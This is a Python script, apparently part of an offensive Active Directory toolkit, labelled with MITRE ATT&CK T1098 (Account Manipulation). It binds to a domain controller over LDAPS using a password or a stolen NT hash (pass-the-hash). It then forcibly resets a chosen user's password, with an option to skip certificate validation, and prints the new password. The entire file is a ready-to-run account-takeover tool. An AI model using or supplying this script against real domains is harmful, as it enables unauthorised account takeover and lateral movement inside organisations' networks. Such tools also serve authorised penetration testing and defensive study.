#!/usr/bin/env python3
"""
change_password.py – reset an existing AD user’s password (LDAPS‑only)

MITRE ATT&CK
  • T1098 – Account Manipulation (sub‑tech: Modify Existing Account)

This helper follows the same argument style as the rest of the toolkit but
**always connects over LDAPS** (encrypted LDAP) because Active Directory will
only accept the `modify_password` extended operation on an SSL/TLS protected
channel.  You may override the port with `--port` (default 636) and skip
certificate validation with `--insecure` when testing against DCs that present
self‑signed certs.
"""
import argparse
import secrets
import string
import ssl
import sys
from typing import Tuple

from ldap3 import (
    ALL,
    NTLM,
    Tls,
    Connection,
    Server,
)
from ldap3.core.exceptions import (
    LDAPException,
    LDAPSocketOpenError,
    LDAPNoSuchObjectResult,
)

# ─────────── helper functions ────────────────────────────────────────────────

def dbg(msg: str):
    if ARGS.debug:
        print(f"[DEBUG] {msg}")


def die(msg: str, rc: int = 1):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(rc)


def strong_password(length: int = 16) -> str:
    """Generate a password that meets default AD complexity (3‑of‑4 classes)."""
    pools = [
        string.ascii_uppercase,
        string.ascii_lowercase,
        string.digits,
        "!@#$%^&*()-_=+[]{}",
    ]
    while True:
        pwd = "".join(secrets.choice("".join(pools)) for _ in range(length))
        if sum(any(c in p for c in pwd) for p in pools) >= 3:
            return pwd


def build_user_dn(domain: str, sam: str, container: str) -> str:
    base = ",".join(f"DC={part}" for part in domain.split("."))
    return f"CN={sam},{container},{base}"


# ─────────── argument parsing ────────────────────────────────────────────────
parser = argparse.ArgumentParser(
    description="Reset an existing AD user password over LDAPS (port 636 by default).",
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
)
parser.add_argument("--dc-ip", required=True, help="Domain Controller IP / FQDN")
parser.add_argument("--port", type=int, default=636, help="LDAPS port to connect to")
parser.add_argument("--domain", required=True, help="AD domain (e.g. corp.local)")
parser.add_argument("--user", required=True, help="Privileged bind account")

auth = parser.add_mutually_exclusive_group(required=True)
auth.add_argument("--password", help="Password for the bind account")
auth.add_argument("--hashes", help="LM:NT or NT hash for pass‑the‑hash bind")

parser.add_argument("--target-user", required=True, help="sAMAccountName to reset")
parser.add_argument("--user-dn", help="Full DN of the target user (skip auto‑build)")
parser.add_argument("--user-ou", default="CN=Users", help="Container/OU for auto DN")
parser.add_argument("--new-pass", help="New password (random if omitted)")
parser.add_argument("--insecure", action="store_true", help="Skip cert validation")
parser.add_argument("--debug", action="store_true", help="Verbose debug output")
ARGS = parser.parse_args()

# ─────────── TLS / LDAPS connection ─────────────────────────────────────────

tls_cfg = Tls(
    validate=ssl.CERT_NONE if ARGS.insecure else ssl.CERT_REQUIRED,
    version=ssl.PROTOCOL_TLSv1_2,
)
server = Server(
    ARGS.dc_ip,
    port=ARGS.port,
    use_ssl=True,  # LDAPS enforced
    get_info=ALL,
    tls=tls_cfg,
)

dbg(f"Connecting LDAPS {ARGS.dc_ip}:{ARGS.port}")

try:
    conn = Connection(
        server,
        user=f"{ARGS.domain}\\{ARGS.user}",
        password=ARGS.password or ARGS.hashes,
        authentication=NTLM,
        auto_bind=True,
        raise_exceptions=True,
    )
    dbg("Bind successful")
except (LDAPSocketOpenError, LDAPException) as e:
    die(f"LDAP bind failed: {e}")

# ─────────── Build DN / generate password ───────────────────────────────────

user_dn = ARGS.user_dn or build_user_dn(ARGS.domain, ARGS.target_user, ARGS.user_ou)
dbg(f"Target DN: {user_dn}")

new_pwd = ARGS.new_pass or strong_password()

dbg("Executing modify_password() …")
try:
    conn.extend.microsoft.modify_password(user_dn, new_pwd)
    print(f"[+] SUCCESS – password for '{ARGS.target_user}' reset to: {new_pwd}")
except LDAPNoSuchObjectResult:
    die(f"Target user not found ({user_dn})")
except LDAPException as e:
    die(f"Password reset failed: {e}")
